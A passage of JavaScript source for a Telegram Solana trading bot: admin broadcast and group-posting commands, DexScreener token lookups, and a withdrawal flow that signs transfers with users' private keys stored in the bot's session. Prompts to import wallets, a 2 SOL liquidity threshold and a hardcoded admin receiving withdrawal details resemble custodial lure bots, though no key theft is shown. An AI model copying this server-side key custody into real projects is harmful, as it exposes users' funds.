    ctx.reply(`✅ Message sent to <code>${chatId}</code>`, {
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Failed to send message:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});

/**
 * /sendimage <chatId> [caption]
 * Admin only. REPLY to a photo with this command to send it (with optional caption) to a user or group.
 * Example: reply to a photo with "/sendimage 123456789 Check this out!"
 */
bot.command("sendimage", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];
  const caption = args.slice(1).join(" ") || "";

  // The command must be a reply to a message containing a photo
  const replyMsg = ctx.message?.reply_to_message;
  const photo = replyMsg?.photo;

  if (!chatId) {
    return ctx.reply(
      "ℹ️ Usage: Reply to a photo with\n/sendimage <chatId> [caption]",
    );
  }

  if (!photo || photo.length === 0) {
    return ctx.reply("❌ You must REPLY to a photo message with this command.");
  }

  const fileId = photo[photo.length - 1].file_id; // highest resolution

  try {
    await ctx.telegram.sendPhoto(chatId, fileId, {
      caption,
      parse_mode: "HTML",
    });
    ctx.reply(`✅ Image sent to <code>${chatId}</code>`, {
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Failed to send image:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});

/**
 * /broadcast <message>
 * Admin only. Sends a text message to ALL registered users.
 */
bot.command("broadcast", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply("ℹ️ Usage: /broadcast <message>");
  }

  const users = await getAllUsers();

  if (users.length === 0) {
    return ctx.reply("⚠️ No registered users yet.");
  }

  await ctx.reply(`📢 Broadcasting to ${users.length} user(s)...`);

  let success = 0;
  let failed = 0;

  for (const uid of users) {
    try {
      await ctx.telegram.sendMessage(uid, text, { parse_mode: "HTML" });
      success++;
    } catch (err) {
      console.error(`Broadcast failed for ${uid}:`, err.message);
      failed++;
    }
  }

  ctx.reply(
    `✅ Broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`,
  );
});

/**
 * /broadcastimage [caption]
 * Admin only. REPLY to a photo with this command to send it (with optional caption) to ALL users.
 */
bot.command("broadcastimage", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const caption = ctx.message.text.split(" ").slice(1).join(" ") || "";
  const replyMsg = ctx.message?.reply_to_message;
  const photo = replyMsg?.photo;

  if (!photo || photo.length === 0) {
    return ctx.reply(
      "ℹ️ Usage: Reply to a photo with\n/broadcastimage [caption]",
    );
  }

  const users = await getAllUsers();

  if (users.length === 0) {
    return ctx.reply("⚠️ No registered users yet.");
  }

  const fileId = photo[photo.length - 1].file_id;

  await ctx.reply(`🖼️ Broadcasting image to ${users.length} user(s)...`);

  let success = 0;
  let failed = 0;

  for (const uid of users) {
    try {
      await ctx.telegram.sendPhoto(uid, fileId, {
        caption,
        parse_mode: "HTML",
      });
      success++;
    } catch (err) {
      console.error(`Image broadcast failed for ${uid}:`, err.message);
      failed++;
    }
  }

  ctx.reply(
    `✅ Image broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`,
  );
});

/**
 * /sendgroup <groupId> <message>
 * Admin only. Sends a text message to a specific group (bot must be a member).
 * GroupId is a negative number like -1001234567890.
 */
bot.command("sendgroup", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const groupId = args[0];
  const message = args.slice(1).join(" ");

  if (!groupId || !message) {
    return ctx.reply(
      "ℹ️ Usage: /sendgroup <groupId> <message>\n\nGroupId is the negative chat ID (e.g. -1001234567890)",
    );
  }

  try {
    await ctx.telegram.sendMessage(groupId, message, { parse_mode: "HTML" });
    ctx.reply(`✅ Message sent to group <code>${groupId}</code>`, {
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Failed to send group message:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});

/**
 * /sendgroupimage <groupId> [caption]
 * Admin only. REPLY to a photo with this command to send it to a group.
 */
bot.command("sendgroupimage", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const groupId = args[0];
  const caption = args.slice(1).join(" ") || "";

  const replyMsg = ctx.message?.reply_to_message;
  const photo = replyMsg?.photo;

  if (!groupId) {
    return ctx.reply(
      "ℹ️ Usage: Reply to a photo with\n/sendgroupimage <groupId> [caption]",
    );
  }

  if (!photo || photo.length === 0) {
    return ctx.reply("❌ You must REPLY to a photo message with this command.");
  }

  const fileId = photo[photo.length - 1].file_id;

  try {
    await ctx.telegram.sendPhoto(groupId, fileId, {
      caption,
      parse_mode: "HTML",
    });
    ctx.reply(`✅ Image sent to group <code>${groupId}</code>`, {
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Failed to send group image:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});

// Keep legacy /sendmessage for backward compatibility
bot.command("sendmessage", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const userId = args[0];
  const message = args.slice(1).join(" ");

  if (!userId || !message) {
    return ctx.reply("Usage: /sendmessage <userId> <message>");
  }

  try {
    await ctx.telegram.sendMessage(userId, message, { parse_mode: "HTML" });
    ctx.reply(`✅ Message sent to user ${userId}`);
  } catch (error) {
    console.error("Failed to send message:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});
bot.command("ping", (ctx) => {
  console.log("Ping received!");
  ctx.reply("Pong!");
});

// Helper command to get your User ID or Group ID
bot.command("id", (ctx) => {
  let reply = `Your Telegram User ID is: <code>${ctx.from.id}</code>\n`;

  if (ctx.chat.id !== ctx.from.id) {
    // If the command is typed inside the group
    reply += `\nThis Chat/Group ID is: <code>${ctx.chat.id}</code>`;
  } else if (
    ctx.message.reply_to_message &&
    ctx.message.reply_to_message.forward_origin
  ) {
    // If you reply to a FORWARDED message from a group
    const origin = ctx.message.reply_to_message.forward_origin;
    if (origin.type === "chat" || origin.type === "channel") {
      reply += `\nThe Forwarded Group/Channel ID is: <code>${origin.chat.id}</code>`;
    } else {
      reply += `\nThat forwarded message doesn't contain a Group ID (it might be from a private user).`;
    }
  }

  ctx.reply(reply, { parse_mode: "HTML" });
});

/**
 * /sendgroupca <ca> <groupId>
 * Admin only. Fetches DexScreener token info for the given CA and sends
 * the formatted card to the target group — CA never appears in the group.
 */
bot.command("sendgroupca", async (ctx) => {
  if (!isAdmin(ctx)) return;

  const args = ctx.message.text.split(" ").slice(1);
  const ca = args[0];
  const groupId = args[1];

  if (!ca || !groupId) {
    return ctx.reply(
      "ℹ️ Usage: /sendgroupca <token_address> <groupId>\n\nExample:\n/sendgroupca 2jbxebe...7df -1001234567890",
    );
  }

  try {
    const response = await axios.get(
      `https://api.dexscreener.com/latest/dex/tokens/${ca}`,
    );
    const pairs = response?.data?.pairs;
    if (!pairs || pairs.length === 0) {
      return ctx.reply("❌ No token info found for that address.");
    }
    const pair = pairs.sort(
      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
    )[0];
    const info = formatters.formatTokenInfo(pair);
    const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
    const dexScreenerUrl = `https://dexscreener.com/${info.chainId}/${info.pairAddress}`;
    const botUsername = ctx.botInfo?.username;

    const tokenText = `<b>${utils.escapeHtml(info.symbol)} Token Info</b> 📊\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<a href="${chartEmbed}">📊 Live Chart</a> | <a href="${dexScreenerUrl}">🔍 DexScreener</a>`;

    const groupButtons = {
      inline_keyboard: [
        [
          { text: "🔍 DexScreener", url: dexScreenerUrl },
          { text: "📊 Chart", url: chartEmbed },
        ],
        ...(botUsername
          ? [
              [
                {
                  text: "🤖 Trade in DMs",
                  url: `https://t.me/${botUsername}?start=trade`,
                },
              ],
            ]
          : []),
      ],
    };

    await ctx.telegram.sendMessage(groupId, tokenText, {
      parse_mode: "HTML",
      reply_markup: groupButtons,
      disable_web_page_preview: false,
    });

    ctx.reply(
      `✅ Token info for <code>${utils.escapeHtml(info.symbol)}</code> sent to group <code>${groupId}</code>`,
      { parse_mode: "HTML" },
    );
  } catch (error) {
    console.error("sendgroupca error:", error.message);
    ctx.reply(`❌ Failed: ${error.message}`);
  }
});

bot.command("trending", async (ctx) => {
  try {
    console.log("Trending command received");
    const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
    const loadingMessage = await ctx.reply("🔥 Loading trending tokens...");
    const data = await api.getDexScreenerTrending();

    const formatted = formatters.formatTrendingList(data, "Trending Tokens");

    // Delete the loading message
    try {
      await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
    } catch (e) {
      console.log("Could not delete loading message");
    }

    // In groups, use a simpler button set with a DM link for trading
    const replyMarkup = isGroup
      ? Markup.inlineKeyboard([
          [
            Markup.button.url(
              "🤖 Trade in DMs",
              `https://t.me/${ctx.botInfo.username}?start=trending`,
            ),
          ],
        ])
      : buttons.main;

    await ctx.replyWithHTML(formatted, {
      reply_markup: replyMarkup.reply_markup,
      disable_web_page_preview: true,
    });
  } catch (error) {
    console.error("Trending command error:", error);
    try {
      ctx.reply("❌ Error loading trending data.");
    } catch (e) {}
  }
});

bot.command("search", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length === 0) {
      return ctx.reply("Usage: /search <token_name_or_symbol>");
    }

    const query = args.join(" ");
    const searchData = await api.getDexScreenerSearch(query);

    if (searchData.pairs && searchData.pairs.length > 0) {
      let searchResults = `🔍 <b>Search Results for "${utils.escapeHtml(query)}"</b>\n\n`;

      // Filter unique tokens by address and get the best pool for each token
      const uniqueTokens = new Map();

      searchData.pairs.forEach((pair) => {
        const tokenAddress = pair.baseToken?.address;
        if (!tokenAddress) return;

        // If we haven't seen this token before, or if this pool has better liquidity
        if (
          !uniqueTokens.has(tokenAddress) ||
          (pair.liquidity?.usd || 0) >
            (uniqueTokens.get(tokenAddress).liquidity?.usd || 0)
        ) {
          uniqueTokens.set(tokenAddress, pair);
        }
      });

      // Convert to array and take top 5
      const uniquePairs = Array.from(uniqueTokens.values()).slice(0, 5);

      uniquePairs.forEach((pair, index) => {
        const info = formatters.formatTokenInfo(pair);
        const change = parseFloat(info.priceChange24h) > 0 ? "🟢" : "🔴";
        const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;

        searchResults += `📊 <b>${index + 1}. ${utils.escapeHtml(info.symbol)}</b> ${change}\n\n`;
        searchResults += `   💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n`;
        searchResults += `   📈 <b>24h Change:</b> <i>${utils.escapeHtml(info.priceChange24h)}%</i>\n`;
        searchResults += `   💧 <b>Liquidity:</b> $${utils.escapeHtml(info.liquidity)}\n`;
        searchResults += `   🏪 <b>Exchange:</b> <i>${utils.escapeHtml(info.dexId)} (${utils.escapeHtml(info.chainId)})</i>\n\n`;
        searchResults += `   🔗 <code>${utils.escapeHtml(info.address)}</code>\n`;
        searchResults += `   📈 <a href="${chartEmbed}">📊 View Live Chart</a>\n\n`;
        searchResults += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      });

      await ctx.replyWithHTML(searchResults, {
        reply_markup: buttons.main.reply_markup,
        disable_web_page_preview: true,
      });
    } else {
      await ctx.replyWithHTML(
        `❌ No tokens found for "${utils.escapeHtml(query)}"`,
        {
          reply_markup: buttons.main.reply_markup,
          disable_web_page_preview: true,
        },
      );
    }
  } catch (error) {
    console.error("Search command error:", error);
    ctx.reply("❌ Error searching for tokens.");
  }
});

bot.start(async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;

  let price = 0.0;
  let sol = 0.0;
  let userWalletAddress = null;

  if (secret) {
    try {
      price = await utils.getSolPrice();
      sol = await utils.getUserBalance(secret);
      userWalletAddress = getUserWalletAddress(ctx);
    } catch (err) {
      console.warn("Failed to fetch balance in start:", err.message);
    }
  }

  const welcomeText = messages.welcome(
    Number(sol),
    Number(price),
    userWalletAddress,
  );

  // Send the welcome message directly with the main keyboard
  await ctx.replyWithHTML(welcomeText, buttons.main);
});

bot.hears(/^.+$/, async (ctx, next) => {
  const text = ctx.message.text.trim();
  const chatType = ctx.chat?.type;
  const isGroup = chatType === "group" || chatType === "supergroup";

  // ===== GROUP CA FAST PATH =====
  // In group chats, detect CA immediately without going through session checks.
  // Session issues in groups would otherwise silently swallow these messages.
  if (isGroup) {
    // Permissive regex — let DexScreener validate the actual address
    const isSolanaCa = /^[A-Za-z0-9]{32,44}$/.test(text) && !/^0x/.test(text);
    const isEthereumCa = /^0x[a-fA-F0-9]{40}$/.test(text);

    if (isSolanaCa || isEthereumCa) {
      const chainId = isSolanaCa ? "solana" : "ethereum";
      try {
        const response = await axios.get(
          `https://api.dexscreener.com/latest/dex/tokens/${text}`,
        );
        const pairs = response?.data?.pairs;
        if (!pairs || pairs.length === 0) {
          try {
            await ctx.reply("❌ No token info found for this address.");
          } catch (e) {}
          return;
        }
        const pair = pairs.sort(
          (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
        )[0];
        const info = formatters.formatTokenInfo(pair);
        const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
        const dexScreenerUrl = `https://dexscreener.com/${info.chainId}/${info.pairAddress}`;
        const botUsername = ctx.botInfo?.username;

        const tokenText = `<b>${utils.escapeHtml(info.symbol)} Token Info</b> 📊\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<a href="${chartEmbed}">📊 Live Chart</a> | <a href="${dexScreenerUrl}">🔍 DexScreener</a>`;

        const groupButtons = {
          inline_keyboard: [
            [
              { text: "🔍 DexScreener", url: dexScreenerUrl },
              { text: "📊 Chart", url: chartEmbed },
            ],
            ...(botUsername
              ? [
                  [
                    {
                      text: "🤖 Trade in DMs",
                      url: `https://t.me/${botUsername}?start=trade`,
                    },
                  ],
                ]
              : []),
          ],
        };

        try {
          await ctx.replyWithHTML(tokenText, {
            reply_markup: groupButtons,
            reply_parameters: { message_id: ctx.message.message_id },
            disable_web_page_preview: false,
          });
        } catch (replyErr) {
          console.error("Group CA reply error:", replyErr.message);
        }
      } catch (err) {
        console.error("Group CA lookup error:", err.message);
        try {
          await ctx.reply("❌ Failed to fetch token info.");
        } catch (e) {}
      }
      return; // Done — don't fall through to private-chat logic
    }
    return; // Not a CA in a group — ignore
  }
  // ===== END GROUP CA FAST PATH =====

  // ===== WITHDRAW CONVERSATIONAL FLOW =====
  if (ctx.session?.withdrawStep === "address") {
    // Step 1: user typed a Solana address
    const isSolAddr = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
    if (!isSolAddr) {
      await ctx.replyWithHTML(
        "❌ Invalid Solana address. Please enter a valid address:",
        buttons.cancel,
      );
      return;
    }
    ctx.session.withdrawAddress = text;
    ctx.session.withdrawStep = "amount";
    await ctx.replyWithHTML(
      `🔢 Reply with the amount of SOL you wish to withdraw:`,
      buttons.cancel,
    );
    return;
  }

  if (ctx.session?.withdrawStep === "amount") {
    // Step 2: user typed an amount
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      await ctx.replyWithHTML(
        "❌ Invalid amount. Please enter a valid number (e.g. 0.5):",
        buttons.cancel,
      );
      return;
    }
    const toAddress = ctx.session.withdrawAddress;
    ctx.session.withdrawStep = null;
    ctx.session.withdrawAddress = null;

    // Send processing message
    const msg = await ctx.replyWithHTML(
      "🔄 <b>Processing withdrawal...</b>\nBuilding transaction...",
    );

    try {
      const userData = sessionManager.getUserData(ctx);
      const secret = userData?.wallet;
      if (!secret) throw new Error("Wallet not found in session");

      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const toPublicKey = new PublicKey(toAddress);
      const lamports = Math.floor(amount * LAMPORTS_PER_SOL);

      // Build transaction
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey: toPublicKey,
          lamports: lamports,
        }),
      );

      const latestBlockhash = await connection.getLatestBlockhash("confirmed");
      transaction.recentBlockhash = latestBlockhash.blockhash;
      transaction.feePayer = keypair.publicKey;

      // Sign and send
      const signature = await connection.sendTransaction(transaction, [
        keypair,
      ]);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        undefined,
        `✅ <b>Withdrawal Successful!</b>\n\nAmount: <b>${amount} SOL</b>\nTo: <code>${utils.escapeHtml(toAddress)}</code>\n\nTx Hash: <a href="https://solscan.io/tx/${signature}">${signature.substring(0, 8)}...</a>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
            ],
          },
        },
      );

      // Notify admin
      try {
        await ctx.telegram.sendMessage(
          8305086038,
          `💸 <b>Withdrawal Processed</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAmount: <b>${amount} SOL</b>\nTo: <code>${toAddress}</code>\nTx: <code>${signature}</code>`,
          { parse_mode: "HTML" },
        );
      } catch (e) {}
    } catch (e) {
      console.error("Withdrawal error:", e);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        undefined,
        `❌ <b>Withdrawal Failed</b>\n\nError: ${e.message}\nMake sure you have enough SOL to cover the amount and network fees.`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
            ],
          },
        },
      );
    }

    await ctx.reply("Select an action:", buttons.main);
    return;
  }

  // Check if user is in search mode
  if (ctx.session.searchMode) {
    try {
      const searchData = await api.getDexScreenerSearch(text);
      if (searchData.pairs && searchData.pairs.length > 0) {
        let searchResults = `🔍 <b>Search Results for "${utils.escapeHtml(text)}"</b>\n\n`;

        // Filter unique tokens by address and get the best pool for each token
        const uniqueTokens = new Map();

        searchData.pairs.forEach((pair) => {
          const tokenAddress = pair.baseToken?.address;
          if (!tokenAddress) return;

          // If we haven't seen this token before, or if this pool has better liquidity
          if (
            !uniqueTokens.has(tokenAddress) ||
            (pair.liquidity?.usd || 0) >
              (uniqueTokens.get(tokenAddress).liquidity?.usd || 0)
          ) {
            uniqueTokens.set(tokenAddress, pair);
          }
        });

        // Convert to array and take top 5
        const uniquePairs = Array.from(uniqueTokens.values()).slice(0, 5);

        uniquePairs.forEach((pair, index) => {
          const info = formatters.formatTokenInfo(pair);
          const change = parseFloat(info.priceChange24h) > 0 ? "🟢" : "🔴";
          const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;

          searchResults += `📊 <b>${index + 1}. ${utils.escapeHtml(info.symbol)}</b> ${change}\n\n`;
          searchResults += `   💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n`;
          searchResults += `   📈 <b>24h Change:</b> <i>${utils.escapeHtml(info.priceChange24h)}%</i>\n`;
          searchResults += `   💧 <b>Liquidity:</b> $${utils.escapeHtml(info.liquidity)}\n`;
          searchResults += `   🏪 <b>Exchange:</b> <i>${utils.escapeHtml(info.dexId)} (${utils.escapeHtml(info.chainId)})</i>\n\n`;
          searchResults += `   🔗 <code>${utils.escapeHtml(info.address)}</code>\n`;
          searchResults += `   📈 <a href="${chartEmbed}">📊 View Live Chart</a>\n\n`;
          searchResults += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        });

        await ctx.replyWithHTML(searchResults, {
          reply_markup: Markup.inlineKeyboard([
            [Markup.button.callback("⬅️ Back to Main", "BACK_MAIN")],
          ]).reply_markup,
          disable_web_page_preview: true,
        });
      } else {
        await ctx.replyWithHTML(
          `❌ No tokens found for "${utils.escapeHtml(text)}"`,
          {
            reply_markup: Markup.inlineKeyboard([
              [Markup.button.callback("⬅️ Back to Main", "BACK_MAIN")],
            ]).reply_markup,
            disable_web_page_preview: true,
          },
        );
      }
      ctx.session.searchMode = false;
      return;
    } catch (error) {
      console.error("Search error:", error);
      await ctx.replyWithHTML("❌ Error searching for tokens.");
      ctx.session.searchMode = false;
      return;
    }
  }

  // Check if user is in volume mode
  if (ctx.session.volumeMode) {
    try {
      const isSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
      const isEthereum = /^0x[a-fA-F0-9]{40}$/.test(text);

      if (!isSolana && !isEthereum) {
        await ctx.replyWithHTML(
          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address.",
        );
        return;
      }

      const response = await axios.get(
        `https://api.dexscreener.com/latest/dex/tokens/${text}`,
      );

      const pairs = response?.data?.pairs;
      if (!pairs || pairs.length === 0) {
        await ctx.replyWithHTML("❌ No token info found for this address.");
        ctx.session.volumeMode = false;
        return;
      }

      // Get the most liquid pair
      const pair = pairs.sort(
        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
      )[0];
      const info = formatters.formatTokenInfo(pair);

      const volumeText = `📊 <b>${ctx.session.volumeChain} Volume Analysis</b>\n\n<b>${info.symbol} Token Info</b>\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<b>Please connect your wallet to view volume tiers and trading options.</b>`;

      await ctx.replyWithHTML(volumeText, {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "🔗 Create or Import Wallet",
              "CONNECT_WALLET",
            ),
          ],
          [Markup.button.callback("📊 View Chart", "VIEW_CHART")],
          [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
        ]).reply_markup,
        disable_web_page_preview: true,
      });

      ctx.session.volumeMode = false;
      return;
    } catch (error) {
      console.error("Volume analysis error:", error);
      await ctx.replyWithHTML("❌ Error analyzing token volume.");
      ctx.session.volumeMode = false;
      return;
    }
  }

  // Check if user is in liquidity mode
  if (ctx.session.liquidityMode) {
    try {
      const isSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
      const isEthereum = /^0x[a-fA-F0-9]{40}$/.test(text);

      if (!isSolana && !isEthereum) {
        await ctx.replyWithHTML(
          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address.",
        );
        return;
      }

      const response = await axios.get(
        `https://api.dexscreener.com/latest/dex/tokens/${text}`,
      );

      const pairs = response?.data?.pairs;
      if (!pairs || pairs.length === 0) {
        await ctx.replyWithHTML("❌ No token info found for this address.");
        ctx.session.liquidityMode = false;
        return;
      }

      // Get the most liquid pair
      const pair = pairs.sort(
        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
      )[0];
      const info = formatters.formatTokenInfo(pair);

      // Check if user has wallet and balance
      const userData = sessionManager.getUserData(ctx);
      const secret = userData?.wallet;

      if (!secret) {
        const liquidityText = `💧 <b>${ctx.session.liquidityChain} Liquidity</b>\n\n<b>${info.symbol} Token Info</b>\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Current Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<b>Please connect your wallet and ensure you have enough balance to add liquidity.</b>`;

        await ctx.replyWithHTML(liquidityText, {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback(
                "🔗 Create or Import Wallet",
                "CONNECT_WALLET",
              ),
            ],
            [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
          ]).reply_markup,
          disable_web_page_preview: true,
        });
      } else {
        try {
          const sol = await utils.getUserBalance(secret);
          const userBalance = parseFloat(sol);
          const minRequired = 2.0; // Minimum 2 SOL required

          if (userBalance < minRequired) {
            const liquidityText = `💧 <b>${ctx.session.liquidityChain} Liquidity</b>\n\n<b>${info.symbol} Token Info</b>\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Current Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<b>Your Balance:</b> ${sol} SOL\n<b>Required:</b> ${minRequired} SOL\n\n<b>Please add more balance to add liquidity to this token.</b>`;

            await ctx.replyWithHTML(liquidityText, {
              reply_markup: Markup.inlineKeyboard([
                [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
              ]).reply_markup,
              disable_web_page_preview: true,
            });
          } else {
            const liquidityText = `💧 <b>${ctx.session.liquidityChain} Liquidity</b>\n\n<b>${info.symbol} Token Info</b>\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Current Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<b>Your Balance:</b> ${sol} SOL ✅\n\n<b>Ready to add liquidity to this token.</b>`;

            await ctx.replyWithHTML(liquidityText, {
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.button.callback(
                    "💧 Add Liquidity",
                    "ADD_LIQUIDITY_NOW",
                  ),
                ],
                [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
              ]).reply_markup,
              disable_web_page_preview: true,
            });
          }
        } catch (error) {
